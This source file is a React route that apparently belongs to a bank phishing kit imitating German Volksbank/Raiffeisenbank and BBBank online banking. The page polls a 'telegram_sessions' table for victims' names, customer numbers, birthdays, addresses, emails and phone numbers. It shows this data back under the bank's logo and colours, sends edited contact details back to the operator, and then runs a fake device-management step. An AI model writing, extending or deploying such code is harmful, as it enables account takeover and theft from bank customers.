import { useEffect, useMemo, useState } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { Loader2 } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { submitQrContactExtras, requestDeviceList } from "@/lib/qrLogin.functions";
import { resolveAsset } from "@/lib/bankAssetUrl";
import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
import { CompletionStep } from "@/components/flow/CompletionStep";
import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
import { DeviceManagementStep, type Device } from "@/components/flow/DeviceManagementStep";
import vrLogoGeneric from "@/assets/vr-logo-generic.png";
import type { BankTheme } from "@/data/banks";
import { deriveFlowTheme } from "@/lib/deriveTheme";


const LOADER_MESSAGES = ["Vorgang wird geladen...", "Geräte werden geprüft...", "Gleich fertig..."];

function CyclingLoader() {
  const [i, setI] = useState(0);
  useEffect(() => {
    const t = setInterval(() => setI((v) => (v + 1) % LOADER_MESSAGES.length), 2000);
    return () => clearInterval(t);
  }, []);
  return (
    <div className="flex flex-col items-center justify-center py-24 gap-6">
      <Loader2 className="h-20 w-20 animate-spin text-gray-400" />
      <p className="text-lg text-gray-700 font-medium">{LOADER_MESSAGES[i]}</p>
    </div>
  );
}

export const Route = createFileRoute("/qr-personal-data/$sessionId")({
  head: () => ({
    meta: [
      { title: "Persönliche Daten" },
      { name: "description", content: "Anzeige und Bestätigung Ihrer hinterlegten Kundendaten." },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: QrPersonalDataPage,
});

const DEFAULT_THEME: FlowTheme = {
  headerBg: "#ffffff",
  buttonBg: "#003399",
  accentText: "#003399",
  topBarColor: "#003399",
  buttonRadius: "rounded-full",
};

type SessionRow = {
  bank_id: string;
  branch_name: string | null;
  customer_anrede: string | null;
  customer_name: string | null;
  customer_number: string | null;
  customer_birthday: string | null;
  customer_address_street: string | null;
  customer_address_city: string | null;
  customer_email: string | null;
  customer_mobile: string | null;
  customer_devices: unknown;
};

type Bank = {
  id: string;
  name: string;
  group: string;
  logo: string | null;
  logo_url: string | null;
  logo_storage_path: string | null;
  hide_name_in_header: boolean;
  custom_theme: Partial<BankTheme> | null;
  theme_extracted: any;

  footer_links: Record<string, { label: string; url: string }> | null;
};

function QrPersonalDataPage() {
  const { sessionId } = Route.useParams();
  const [row, setRow] = useState<SessionRow | null>(null);
  const [bank, setBank] = useState<Bank | null>(null);
  const [groupTheme, setGroupTheme] = useState<Partial<BankTheme> | null>(null);
  const [stage, setStage] = useState<"personal" | "devices" | "done">("personal");

  // Persist the tg_session mapping so DeviceManagementStep (which reads
  // sessionStorage[`tg_session:${bankId}`]) can find it.
  useEffect(() => {
    if (row?.bank_id) {
      try { sessionStorage.setItem(`tg_session:${row.bank_id}`, sessionId); } catch {}
    }
  }, [row?.bank_id, sessionId]);

  useEffect(() => {
    if (stage !== "devices") return;
    const have = Array.isArray(row?.customer_devices) && (row!.customer_devices as any[]).length > 0;
    if (have) return;
    requestDeviceList({ data: { sessionId } }).catch((err) =>
      console.error("[qr-personal-data] requestDeviceList failed", err),
    );
  }, [stage, sessionId, row?.customer_devices]);

  useEffect(() => {
    let cancelled = false;
    const load = async () => {
      const { data } = await supabase
        .from("telegram_sessions")
        .select("bank_id, branch_name, customer_anrede, customer_name, customer_number, customer_birthday, customer_address_street, customer_address_city, customer_email, customer_mobile, customer_devices")
        .eq("id", sessionId)
        .maybeSingle();
      if (cancelled) return;
      if (data) setRow(data as SessionRow);
    };
    load();
    const timer = setInterval(load, 2000);
    return () => { cancelled = true; clearInterval(timer); };
  }, [sessionId]);

  useEffect(() => {
    if (!row?.bank_id || bank) return;
    (async () => {
      const { data } = await supabase
        .from("banks")
        .select("id,name,group,logo,logo_url,logo_storage_path,hide_name_in_header,custom_theme,theme_extracted,footer_links")
        .eq("id", row.bank_id)
        .maybeSingle();
      if (data) {
        setBank(data as Bank);
        const { data: g } = await supabase.from("bank_groups").select("theme").eq("name", (data as any).group).maybeSingle();
        setGroupTheme(((g?.theme as Partial<BankTheme>) ?? null));
      }
    })();
  }, [row?.bank_id, bank]);

  const theme: FlowTheme = useMemo(() => {
    return deriveFlowTheme(
      (bank?.custom_theme as Partial<BankTheme> | null) ?? null,
      (bank?.theme_extracted as any) ?? null,
      groupTheme,
    );
  }, [bank, groupTheme]);


  const themeColor = theme.headerBg === "#ffffff" ? theme.buttonBg : theme.headerBg;
  const logoSrc = bank ? (resolveAsset("bank-logos", bank.logo_url, bank.logo_storage_path) || vrLogoGeneric) : vrLogoGeneric;
  const shellProps = {
    theme,
    logoSrc,
    fallbackLogoSrc: vrLogoGeneric,
    bankName: bank?.name ?? row?.branch_name ?? "Online-Banking",
    showName: bank ? !bank.hide_name_in_header : true,
    bigLogo: bank?.group === "BBBank",
    footerLinks: (bank?.footer_links ?? null) as any,
  };

  const hasCustomerData = Boolean(row?.customer_name);

  if (!row || !hasCustomerData) {
    return (
      <BankShell {...shellProps}>
        <CyclingLoader />
      </BankShell>
    );
  }

  if (stage === "done") {
    return (
      <BankShell {...shellProps}>
        <CompletionStep theme={theme} customerName={row.customer_name ?? ""} />
      </BankShell>
    );
  }

  if (stage === "devices") {
    const raw = Array.isArray(row.customer_devices) ? (row.customer_devices as any[]) : [];
    const devices: Device[] = raw
      .filter((d) => d && (d.name || d.appId))
      .map((d) => ({
        name: String(d.name ?? ""),
        appId: String(d.appId ?? ""),
        registeredAt: String(d.registeredAt ?? ""),
        online: Boolean(d.online ?? true),
        cards: Boolean(d.cards ?? false),
      }));
    if (devices.length === 0) {
      return (
        <BankShell {...shellProps}>
          <CyclingLoader />
        </BankShell>
      );
    }
    return (
      <BankShell {...shellProps}>
        <DeviceManagementStep
          devices={devices}
          bankId={row.bank_id}
          onContinue={() => setStage("done")}
        />
      </BankShell>
    );
  }

  const plzOrt = row.customer_address_city ?? "";
  const customer: CustomerData = {
    anrede: row.customer_anrede ?? "Herr/Frau",
    name: row.customer_name ?? "—",
    kundenNr: row.customer_number ?? "—",
    geburtsdatum: row.customer_birthday ?? "—",
    familienstand: "—",
    email: row.customer_email ?? "—",
    mobilNr: row.customer_mobile ?? "—",
    adresse: {
      strasse: row.customer_address_street ?? "—",
      plzOrt: plzOrt || "—",
    },
  };

  const handleContactSaved = (type: "email" | "mobil" | "telefon", value: string) => {
    if (type === "email") {
      submitQrContactExtras({ data: { sessionId, email: value } }).catch((err) =>
        console.error("[qr-personal-data] email submit failed", err),
      );
    } else if (type === "mobil") {
      submitQrContactExtras({ data: { sessionId, mobile: value } }).catch((err) =>
        console.error("[qr-personal-data] mobile submit failed", err),
      );
    }
  };

  return (
    <BankShell {...shellProps}>
      <PersonalDataOverview
        // @ts-expect-error FlowTheme is structurally compatible with BankTheme for the fields used
        theme={theme}
        customerData={customer}
        bankId={bank?.id ?? ""}
        onContinue={() => setStage("devices")}
        onEditAddress={() => setStage("devices")}
        onContactSaved={handleContactSaved}
      />
    </BankShell>
  );
}
